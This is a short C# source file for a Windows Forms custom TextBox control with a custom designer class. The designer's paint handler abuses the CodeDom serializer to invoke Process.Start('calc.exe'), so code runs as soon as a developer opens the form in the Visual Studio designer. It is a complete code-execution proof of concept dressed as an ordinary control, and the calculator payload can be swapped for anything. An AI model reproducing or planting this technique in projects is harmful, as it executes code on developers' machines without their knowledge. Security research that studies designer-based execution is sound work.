using System;
using System.CodeDom;
using System.ComponentModel;
using System.ComponentModel.Design.Serialization;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using System.Windows.Forms.Design;

namespace CustomControl
{
    [Designer(typeof(CustomRootDesigner))]
    public class CustomUserControl : TextBox
    {
        public CustomUserControl()
        {
            this.BackColor = System.Drawing.Color.LightBlue;
        }
    }

    public class CustomRootDesigner : ParentControlDesigner
    {
        public override void Initialize(IComponent component)
        {
            base.Initialize(component);
        }

        protected override void OnPaintAdornments(PaintEventArgs pe)
        {
            base.OnPaintAdornments(pe);

            var site = this.Component.Site;
            var manager = site.GetService(typeof(IDesignerSerializationManager)) as DesignerSerializationManager;
            using (manager.CreateSession())
            {
                var serializer = manager.GetSerializer(null, typeof(CodeDomSerializer)) as CodeDomSerializer;
                serializer.Deserialize(manager,
                    new CodeMethodInvokeExpression(
                        new CodeTypeReferenceExpression("System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"),
                        "Start",
                        new CodePrimitiveExpression("calc.exe"))
                    );
            }
        }
    }
}
